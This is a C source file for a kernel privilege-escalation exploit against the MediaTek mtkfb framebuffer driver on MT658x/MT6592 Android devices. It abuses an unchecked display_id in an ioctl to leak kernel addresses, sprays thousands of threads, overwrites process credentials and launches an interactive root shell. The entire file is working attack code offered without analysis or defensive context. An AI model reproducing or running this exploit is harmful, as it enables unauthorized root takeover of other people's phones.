/*
mtkfb exploit for mt658x & mt6592
author: secauo
website: secauo.com
*/

#include "mtkfbExploit.h"

#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>

#define THREAD_INFO_START 0xC8000000
#define THREAD_INFO_END 0xEFFF0000
#define MAX_NUM 200000

static bool is_kernel_writing = false;
static unsigned long magic_num = 0;

pthread_mutex_t mut = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t cond = PTHREAD_COND_INITIALIZER;

static unsigned long GetDispifInfoAddr(int fd) {
	 void *addr = NULL;
	 struct mtk_dispif_info dispif_info;
	 int i = 0;

	 addr = mmap((unsigned long *) 0x50000000, 0x3000000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	 if ((unsigned long) addr != 0x50000000) {
	 	perror("mmap");
	 	exit(-1);
	 }
	 memset(addr, 0x41, 0x3000000);

	 dispif_info.display_id = 0xA04EC4EC;
	 if(ioctl(fd, MTKFB_GET_DISPLAY_IF_INFORMATION, &dispif_info) == -1) {
	 	perror("ioctl");
	 	close(fd);
	 	exit(-1);
	 }

	 for (i = 0; i < 0x3000000; i += 4) {
	 	if (*((unsigned long *) ((unsigned long) addr + i)) != 0x41414141) {
	 		return ((unsigned long) addr + i - 0x20 - 0xA04EC4EC * 0x34);
	 	}
	 }

	 return 0;
}


static int GetAllDisplayId(unsigned long dispif_info_addr, unsigned long *all_display_id) {
	unsigned long addr = 0;
	unsigned long display_id = 0x80000000;
	int cur_num = 0;

	for (addr = dispif_info_addr + display_id * 0x34 + 0x20; addr < THREAD_INFO_END; display_id += 1, addr += 0x34) {
		if (addr > THREAD_INFO_START && (addr & 0x1FFF) == 0x1FF8 && display_id >= 0x80000000) {
			all_display_id[cur_num] = display_id;
			++cur_num;
		}
	}
	return cur_num;
}

static bool TryExploit(unsigned long display_id, int fd) {
	struct mtk_dispif_info dispif_info;

	memset(&dispif_info, 0, sizeof(dispif_info));
	dispif_info.display_id = display_id;
	if(ioctl(fd, MTKFB_GET_DISPLAY_IF_INFORMATION, &dispif_info) == -1) {
			perror("ioctl");
			close(fd);
			exit(-1);
	}

	if (dispif_info.lcmOriginalHeight == 0xBF000000 && dispif_info.lcmOriginalWidth >= 0 && dispif_info.lcmOriginalWidth <= 10) {
		memset(&dispif_info, 0, sizeof(dispif_info));
		dispif_info.display_id = display_id + 0x4EC4EC5 * 3;
		if(ioctl(fd, MTKFB_GET_DISPLAY_IF_INFORMATION, &dispif_info) == -1) {
			perror("ioctl");
			close(fd);
			exit(-1);
		}
		if (dispif_info.isConnected >= 0xC0000000) {
			return true;
		}
	}
	return false;
}

static void DoRoot(void) {
	if (EscalationByModifyCreds("secauo", true, magic_num)) {
		printf("Root success!\n");
		system("/system/bin/sh -i\n");
	}
}

void SprayingThread(void) {
	unsigned long i = 0;
	while (!is_kernel_writing) {
		pthread_mutex_lock(&mut);
		pthread_cond_wait(&cond, &mut);
		pthread_mutex_unlock(&mut);
		if (ReadPipe((unsigned long *) 0xc0800000, &i, 4) != -1) {
			is_kernel_writing = true;
			printf("We need to get root here!\n");
			DoRoot();
		}		
	}
}

int main() {
	int fd = 0;
	unsigned long dispif_info_addr = 0;
	int num = 0;
	int i = 0;
	pthread_t thread[2800];
	int round = 0;
	unsigned long all_display_id[MAX_NUM];

	prctl(PR_SET_NAME, "secauo", 0, 0, 0);

	fd = open("/dev/graphics/fb0", O_RDONLY);
	if (fd < 0) {
		perror("open /dev/graphics/fb0");
		exit(-1);
	}

	dispif_info_addr = GetDispifInfoAddr(fd);
	if (dispif_info_addr == 0) {
		fprintf(stderr, "can not find dispif_info addr\n");
		close(fd);
		exit(-1);
	}
	printf("dispif_info_addr=0x%lx\n", dispif_info_addr);

	num = GetAllDisplayId(dispif_info_addr, all_display_id);

	for (i = 0; i < 2800; ++i) {
		pthread_create((pthread_t *) &thread, NULL, (void *) SprayingThread, NULL);
	}

	printf("Spraying thread done!\n");

	for (i = 0; i < num; ++i) {
		magic_num = dispif_info_addr + all_display_id[i] * 0x34 + 0x28;
		if (TryExploit(all_display_id[i], fd)) {
			++round;
			printf("Trying exp with display_id: 0x%lx, magic_num: 0x%lx\n", all_display_id[i], magic_num);
			printf("%d round...\n", round);
			pthread_cond_broadcast(&cond);
			sleep(1);
			if (is_kernel_writing) {
				pthread_cond_broadcast(&cond);
				break;
			}
		}
	}

	for (i = 0; i < 2800; ++i) {
		pthread_join(thread[i], NULL);
	}

	close(fd);

	sleep(12121);
}

